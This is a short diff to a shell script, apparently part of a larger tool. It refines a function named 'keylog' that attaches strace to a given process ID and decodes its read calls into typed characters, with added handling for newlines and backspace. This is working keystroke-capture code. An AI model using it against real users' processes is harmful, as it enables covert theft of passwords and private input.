@@ -85,8 +85,10 @@ colours() {
 keylog() {
   strace -p $1 -f -eread -xx 2>&1 | while read line ; do
     char=$( echo $line | cut -f2 -d, | tr -d '"' | cut -c2- )
-    if [[ $char == *"x0d"* ]] ; then
+    if [[ $char == *"x0d"* ]] ; then #handle CRNL
       echo -en "\n"
+    elif [[ $char == *"x7f" ]] ; then
+      echo -en "\b"
     else
       echo -en "\\$char"
     fi
